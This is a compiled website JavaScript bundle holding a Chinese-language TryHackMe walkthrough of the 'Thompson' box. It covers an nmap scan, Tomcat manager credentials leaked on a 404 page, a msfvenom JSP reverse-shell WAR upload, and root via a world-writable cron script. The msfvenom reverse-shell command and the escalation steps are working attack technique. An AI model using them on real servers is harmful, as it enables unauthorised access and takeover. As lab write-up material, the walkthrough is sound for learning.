"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8941],{33492:(n,t,e)=>{e.r(t),e.d(t,{assets:()=>i,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>c,toc:()=>l});var o=e(74848),s=e(28453);const r={sidebar_position:54,tags:["Easy","Linux","Tomcat","\u5b9a\u65f6\u4efb\u52a1"],title:"Thompson",description:"Thompson",sidebar_label:"Thompson",slug:"/tryhackme/54"},a="Thompson",c={id:"box/TryHackMe/54",title:"Thompson",description:"Thompson",source:"@site/docs/box/TryHackMe/54.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/54",permalink:"/docs/tryhackme/54",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"Tomcat",permalink:"/docs/tags/tomcat"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:54,frontMatter:{sidebar_position:54,tags:["Easy","Linux","Tomcat","\u5b9a\u65f6\u4efb\u52a1"],title:"Thompson",description:"Thompson",sidebar_label:"Thompson",slug:"/tryhackme/54"},sidebar:"boxSidebar",previous:{title:"Poster",permalink:"/docs/tryhackme/53"},next:{title:"Couch",permalink:"/docs/tryhackme/55"}},i={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080 - Tomcat",id:"8080---tomcat",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"tomcat",id:"tomcat",level:3},{value:"tomcat --&gt; root",id:"tomcat----root",level:3}];function d(n){const t={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...n.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.h1,{id:"thompson",children:"Thompson"}),"\n",(0,o.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-149-225:~/bsidesgtthompson# nmap -sTCV -p 22,8009,8080 --min-rate 1000 10.10.172.5\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-31 10:10 BST\nNmap scan report for ip-10-10-172-5.eu-west-1.compute.internal (10.10.172.5)\nHost is up (0.00016s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)\n|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)\n|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (EdDSA)\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)\n|_ajp-methods: Failed to get a valid response for the OPTION request\n8080/tcp open  http    Apache Tomcat 8.5.5\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/8.5.5\nMAC Address: 02:91:A7:93:A0:A3 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.73 seconds\n"})}),"\n",(0,o.jsx)(t.h2,{id:"8080---tomcat",children:"8080 - Tomcat"}),"\n",(0,o.jsx)(t.p,{children:"\u8bbf\u95ee\u8be5\u9875\u9762\u53d1\u73b0\u662f Tomcat \u9ed8\u8ba4\u9875\u9762, \u63a5\u7740\u6211\u8bbf\u95ee\u7ba1\u7406\u540e\u53f0\u4f46\u662f\u9700\u8981\u51ed\u8bc1, \u6b64\u65f6\u6211\u62d2\u7edd\u53ef\u4ee5\u53d1\u73b0\u5728 404 \u9875\u9762\u6709\u4e00\u4e2a\u51ed\u8bc1"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702212310.png",alt:"20240702212310"})}),"\n",(0,o.jsx)(t.p,{children:"\u4f7f\u7528\u8fd9\u4e2a\u51ed\u8bc1\u6211\u4eec\u5c31\u53ef\u4ee5\u4e0a\u4f20\u540e\u95e8"}),"\n",(0,o.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(t.h3,{id:"tomcat",children:"tomcat"}),"\n",(0,o.jsx)(t.p,{children:"\u4f7f\u7528 MSF \u751f\u6210 WAR \u540e\u95e8\u5e76\u4e0a\u4f20"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-149-225:~/bsidesgtthompson# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.149.225 LPORT=4444 -f war > shell.war\nPayload size: 1095 bytes\nFinal size of war file: 1095 bytes\n\nroot@ip-10-10-149-225:~/bsidesgtthompson#\n"})}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702212406.png",alt:"20240702212406"})}),"\n",(0,o.jsx)(t.p,{children:"\u4e0a\u4f20\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbf\u95ee"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702212416.png",alt:"20240702212416"})}),"\n",(0,o.jsx)(t.h3,{id:"tomcat----root",children:"tomcat --\x3e root"}),"\n",(0,o.jsx)(t.p,{children:"\u6211\u53d1\u73b0\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u4ee5 root \u8eab\u4efd\u8fd0\u884c, \u5e76\u4e14\u6211\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e2a\u5b9a\u65f6\u4efb\u52a1\u6267\u884c\u7684\u811a\u672c\u6587\u4ef6"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"(remote) tomcat@ubuntu:/home/jack$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *\t* * *\troot\tcd /home/jack && bash id.sh\n#\n(remote) tomcat@ubuntu:/home/jack$ ls -al id.sh\ntotal 48\ndrwxr-xr-x 4 jack jack 4096 Aug 23  2019 .\ndrwxr-xr-x 3 root root 4096 Aug 14  2019 ..\n-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh\n\n"})}),"\n",(0,o.jsxs)(t.p,{children:["\u4fee\u6539\u8fd9\u4e2a ",(0,o.jsx)(t.code,{children:"id.sh"})," \u6765\u83b7\u53d6 Shell"]}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702212439.png",alt:"20240702212439"})})]})}function h(n={}){const{wrapper:t}={...(0,s.R)(),...n.components};return t?(0,o.jsx)(t,{...n,children:(0,o.jsx)(d,{...n})}):d(n)}},28453:(n,t,e)=>{e.d(t,{R:()=>a,x:()=>c});var o=e(96540);const s={},r=o.createContext(s);function a(n){const t=o.useContext(r);return o.useMemo((function(){return"function"==typeof n?n(t):{...t,...n}}),[t,n])}function c(n){let t;return t=n.disableParentContext?"function"==typeof n.components?n.components(s):n.components||s:a(n.components),o.createElement(r.Provider,{value:t},n.children)}}}]);